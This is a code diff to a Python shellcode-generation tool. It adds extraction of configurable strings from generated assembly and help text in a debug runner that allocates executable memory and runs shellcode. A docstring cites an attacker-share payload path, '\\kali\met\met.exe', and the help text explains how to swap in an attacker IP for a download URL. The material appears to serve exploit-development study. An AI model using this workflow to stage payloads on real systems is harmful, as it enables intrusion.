@@ -388,6 +388,23 @@ if __name__ == "__main__":
 '''
 
 
+def _extract_configurable_strings(asm: str) -> list[tuple[str, str]]:
+    """Extract (label, value) pairs from string comment markers in the assembly.
+
+    Looks for lines like:  ; --- src_path: "\\\\kali\\met\\met.exe" (push) ---
+    Skips DLL loader strings (advapi_dll, urlmon_dll, etc.) since those
+    are fixed and not user-configurable.
+    """
+    import re
+    _DLL_LABELS = {"advapi_dll", "urlmon_dll", "wininet_dll", "ws2_32_dll"}
+    pairs: list[tuple[str, str]] = []
+    for m in re.finditer(r'; --- (\w+): "(.*?)" \(push\) ---', asm):
+        label, value = m.group(1), m.group(2)
+        if label not in _DLL_LABELS:
+            pairs.append((label, value))
+    return pairs
+
+
 def _generate_debug_runner(asm: str) -> str:
     """Generate a self-contained Python debug script with inline assembly.
 
@@ -395,8 +412,23 @@ def _generate_debug_runner(asm: str) -> str:
     allocates RWX memory, prints the address for WinDbg, pauses, then
     executes. The assembly is embedded so it can be edited directly.
     """
+    config_strings = _extract_configurable_strings(asm)
     asm = asm.replace(";", "#")
     escaped_asm = asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
+
+    string_ref_lines = ""
+    if config_strings:
+        string_ref_lines = "\nConfigurable strings (search CODE for the label to find the push block):\n"
+        for label, value in config_strings:
+            string_ref_lines += f"  {label}: \"{value}\"\n"
+        string_ref_lines += (
+            "\nTo change a string (e.g. IP address in src_path or url):\n"
+            "  1. Search this file for '# --- <label>' to find the push block\n"
+            "  2. Generate a replacement with strings.py:\n"
+            "       python strings.py --string '<new value>' --method push --badchars 00\n"
+            "  3. Replace the push instructions between the comment and 'mov esi, esp'\n"
+        )
+
     return f'''\
 #!/usr/bin/env python3
 """Debug runner for emitter-generated shellcode.
@@ -413,7 +445,7 @@ Attach WinDbg to this exact python.exe process before pressing Enter.
 The allocation remains valid while this Python process is alive.
 Use the printed address to set a breakpoint:
   bp <address>
-"""
+{string_ref_lines}"""
 import ctypes
 import sys
 
